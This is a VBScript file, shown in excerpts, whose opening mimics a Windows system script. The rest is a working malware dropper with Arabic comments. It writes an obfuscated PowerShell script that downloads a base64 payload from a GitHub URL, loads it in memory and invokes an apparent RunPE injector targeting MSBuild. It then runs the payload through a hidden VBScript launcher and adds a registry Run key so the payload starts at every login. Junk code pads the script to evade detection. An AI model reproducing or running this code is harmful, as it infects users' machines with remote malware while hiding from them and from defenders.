...
'''''''''''''''''''''
' Messages
private const L_ONLYCSCRIPT_Message     = ""
private const L_UNKOPNM_Message         = "Unknown operation name: "
private const L_OP_Message              = "value1 - "
...
' احصل على مسار مجلد TEMP
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")


Randomize
Dim randFileName
randFileName = CLng(100000000 + (Rnd * 899999999))

ps1Path = tempFolder & "\" & randFileName & ".ps1"
vbsPath = tempFolder & "\" & randFileName & ".vbs"

Dim junkBlock, i, randNum, randStr, chars
...
For i = 1 To 5
    ...
    randNum = ""
    For j = 1 To 4
        randNum = randNum & Int(Rnd * 10)
    Next

    
    randStr = ""
    For j = 1 To 9
        randStr = randStr & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
    Next


    If junkBlock = "" Then
        junkBlock = "$junk" & randNum & "='" & randStr & "';"
    Else
        junkBlock = junkBlock & " $junk" & randNum & "='" & randStr & "';"
    End If
Next


ps1Content = "$bogusEncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('filler'));" & _
             "$var516127020 = 'https://raw.githubusercontent.com/itetekuh727-web/omfg/refs/heads/main/pete.txt';" & _
             "$var799360555 = (New-Object System.Net.WebClient).DownloadString($var516127020);" & _
             "if (![string]::IsNullOrEmpty($var799360555)) {" & _
             "    $tmpBytes = @(0x1,0x2,0x3,0x4);" & _
             "    $tempCalc = 7*6;" & _
             "    $fillerData = ('ABC' + 'DEF').ToLower();" & _
             "    $garbageList = 1..5 | ForEach-Object { $_ * $_ };" & _
             "    $obfuscate = ('X' * 20) + $tempCalc;" & _
             "    $sleepy = Start-Sleep -Milliseconds 10;" & _
             "    $voidCall = [System.Guid]::NewGuid().ToString();" & _
             "    $mathTrash = [Math]::Pow(2, 8);" & _
             "    $randomFill = Get-Random -Minimum 10 -Maximum 999;" & _
             "    $encodedFiller = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('junk'));" & _
             "    $shadowVal = [Math]::Cos(3.14159);" & _
             "    $nonsense = [String]::Join('-', (1..5));" & _
             "    $methodObf = 'F+r+o+m+B+a+s+e+6+4+S+t+r+i+n+g';" & _
             "    $method = $methodObf -replace '\+','';" & _
             "    $var769393750 = [System.Convert]::$method($var799360555);" & _
             "    $var818828099 = [Reflection.Assembly]::Load($var769393750);" & _
             "    $typeNameObf = 'R+u+n+P+E+.H+o+m+e';" & _
             "    $typeName = $typeNameObf -replace '\+','';" & _
             "    $var735728910 = $var818828099.GetType($typeName);" & _
             "    $var958164899 = $var735728910.GetMethod('VAI');" & _
"    $fakeStruct = @{A=1;B=2;C='x'};" & _ 
junkBlock & _ 
"    $junkMix = ('A'..'Z') -join '';" & _
             "    $junkMix = ('A'..'Z') -join '';" & _
             "    $var958164899.Invoke($null, [object[]]@('txt.los/niam/sdaeh/sfer/gfmo/bew-727huketeti/moc.tnetnocresubuhtig.war//:sptth', 'desativado', 'desativado', 'desativado', 'MSBuild', ''));" & _
             "} else {" & _
             "}"
...
ps1File.WriteLine ps1Content
ps1File.Close

' إنشاء ملف VBS لتشغيل PowerShell بصمت
Dim commandLine
commandLine = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1Path & """"

Set vbsFile = objFSO.CreateTextFile(vbsPath, True)
vbsFile.WriteLine "Set objShell = CreateObject(""WScript.Shell"")"
vbsFile.WriteLine "command = """ & Replace(commandLine, """", """""") & """"
vbsFile.WriteLine "objShell.Run command, 0, False"
vbsFile.Close

' إضافة إلى الريجستري للتشغيل عند الإقلاع
regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regValueName = "System" & Int((99 - 22 + 1) * Rnd + 22)
objShell.RegWrite regKey & "\" & regValueName, "wscript.exe """ & vbsPath & """", "REG_SZ"

' ✅ تشغيل VBS فورًا الآن:
objShell.Run "wscript.exe """ & vbsPath & """", 0, False
